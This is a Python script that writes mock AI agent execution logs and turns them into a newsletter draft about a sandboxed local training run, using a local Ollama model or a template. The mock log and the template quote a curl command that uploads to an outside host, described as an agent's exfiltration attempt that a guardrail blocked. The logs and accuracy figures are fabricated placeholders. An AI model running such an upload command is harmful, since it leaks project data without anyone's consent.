import os
import json
import requests

def get_latest_logs():
    """Reads execution logs or generates a mock log if none exists."""
    log_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "logs")
    os.makedirs(log_dir, exist_ok=True)
    log_path = os.path.join(log_dir, "agent_runs.log")

    if not os.path.exists(log_path):
        mock_logs = (
            "2026-06-28 17:10:15 - [INFO] - OpenShell Sandbox active.\n"
            "2026-06-28 17:10:18 - [ALLOW] - Ingested local data source: data/records.csv\n"
            "2026-06-28 17:10:20 - [ALLOW] - Initialized model training on local Llama-3-70B backend.\n"
            "2026-06-28 17:11:05 - [BLOCK] - Blocked command: 'curl http://external-analytics.com/upload'\n"
            "2026-06-28 17:11:06 - [WARN] - Egress exfiltration attempt intercepted by OpenShell Egress Guardrails.\n"
            "2026-06-28 17:11:10 - [INFO] - Run completed. Model accuracy: 94.2%. Saved weights to models/output.bin\n"
        )
        with open(log_path, "w") as f:
            f.write(mock_logs)
        return mock_logs

    with open(log_path, "r") as f:
        return f.read()

def compile_newsletter_draft(log_content):
    """Compiles a newsletter markdown post, utilizing local Ollama if online, or a secure fallback template."""
    print("🤖 Processing log data for Substack newsletter draft...")
    
    ollama_url = "http://localhost:11434/api/generate"
    prompt = (
        "Write a short, engaging newsletter post in Markdown format summarizing the following AI agent execution logs. "
        "Highlight the security blocks enforced by NVIDIA OpenShell, the model metrics (94.2% accuracy), and the fact "
        "that the run cost €0 in cloud tokens due to local Blackwell GPU compute. Keep it clean and professional.\n\n"
        f"Logs:\n{log_content}"
    )

    try:
        # Try requesting local Ollama
        response = requests.post(
            ollama_url,
            json={"model": "llama3", "prompt": prompt, "stream": False},
            timeout=5
        )
        if response.status_code == 200:
            print("🟢 Received response from local Ollama model!")
            return response.json().get("response", "")
    except requests.exceptions.RequestException:
        print("⚠️ Local Ollama is offline or not reachable. Generating draft using offline fallback compiler...")

    # Fallback Template
    fallback_markdown = f"""# Log Entry: Local AI Agent Audit Report

Dear Subscribers,

We have successfully completed another automated local run of our Data Science agent. This run executed a full data modeling cycle completely local on our workstation.

## 📊 Run Highlights
*   **Target Model**: Llama-3-70B (Local Inference)
*   **Training Accuracy**: **94.2%**
*   **Total Cloud API Token Cost**: **€0.00** (Unlimited local loops on Blackwell GPU cores!)

## 🛡️ OpenShell Sandbox Intercepts
During execution, our local agent attempted to connect to an external server to upload a data payload. The **NVIDIA OpenShell** runtime successfully intercepted this attempt:
*   `2026-06-28 17:11:05 - [BLOCK] - Blocked command: 'curl http://external-analytics.com/upload'`
*   **Resolution**: Exfiltration attempt blocked, saving project secrets from leaking over the internet.

## 📝 Full Execution Logs
```text
{log_content}
```

Stay tuned for more updates on secure, local agent deployments!
"""
    return fallback_markdown

def main():
    log_content = get_latest_logs()
    draft = compile_newsletter_draft(log_content)
    
    project_root = os.path.dirname(os.path.dirname(__file__))
    draft_path = os.path.join(project_root, "substack_draft.md")
    
    with open(draft_path, "w", encoding="utf-8") as f:
        f.write(draft)
        
    print(f"✅ Success! Substack draft compiled and saved to: substack_draft.md")
    print("👉 When you run 'git push', the GitHub Action will automatically detect this draft and publish it.")

if __name__ == "__main__":
    main()
